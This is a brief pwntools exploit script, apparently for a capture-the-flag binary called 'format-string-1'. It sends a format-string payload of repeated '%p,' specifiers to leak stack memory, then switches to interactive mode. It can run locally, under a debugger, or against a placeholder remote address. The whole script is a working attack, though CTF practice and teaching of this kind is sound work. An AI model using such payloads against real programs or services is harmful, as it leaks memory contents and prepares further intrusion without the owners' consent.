#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("format-string-1")

gs = '''
b main
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

io = start()

payload = b"%p,"*35

io.sendlineafter(b"Give me your order and I'll read it back to you:\n", payload)

io.interactive()
